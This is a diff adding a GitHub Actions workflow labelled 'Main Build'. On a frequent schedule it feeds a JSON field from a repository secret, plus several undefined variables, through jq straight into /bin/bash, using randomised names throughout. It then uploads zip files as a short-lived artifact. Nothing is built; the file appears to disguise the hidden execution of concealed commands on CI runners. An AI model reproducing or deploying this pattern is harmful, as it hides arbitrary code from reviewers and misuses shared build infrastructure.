@@ -1,0 +1,31 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '40 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  start:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute task
+        env:
+          kbgp713: ${{ secrets.kbgp713 }}
+        run: |
+          printf '%s' "$kbgp713" | jq -r .cez03 | /bin/bash
+          echo $nwhmu3 | jq -r .olckk905 | /bin/bash
+          echo $rksz72063 | jq -r .m6 | /bin/bash
+          printf '%s' "$lnvez05416" | jq -r .qbm558 | /bin/bash
+          printf '%s' "$i25" | jq -r .yofri8643 | /bin/bash
+
+      - name: Persist data
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: Iy8axXM3
+          path: "*.zip"
+          retention-days: 1
